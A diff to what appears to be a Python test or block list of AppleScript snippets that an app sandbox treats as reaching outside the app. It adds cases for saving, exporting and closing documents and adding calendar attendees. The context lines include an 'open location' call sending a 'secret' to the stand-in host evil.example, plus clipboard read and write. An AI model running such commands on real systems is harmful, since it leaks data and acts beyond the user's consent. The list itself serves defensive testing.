@@ -124,6 +124,14 @@ _PAST_THE_APP = [
     'open location "https://evil.example/?d=secret"',         # open location
     'set u to URL "https://evil.example"',                    # URL
     'set the clipboard to "secret"', 'get the clipboard',     # clipboard (set and get)
+    # Writing a file through the app, and sending an invitation (user 2026-10-20; ⓪Plan on Opus 5.5): one
+    # case per word, so each keeps its own mutation.
+    'save document 1',                                        # save
+    'close document 1 saving yes',                            # saving
+    'export document 1 to f as PDF',                          # export
+    'set n to 1 -- exporting',                                # exporting
+    'make new attendee at end of event 1 with properties {email:"a@example.com"}',   # attendee
+    'count attendees of event 1',                             # attendees
 ]
 
 
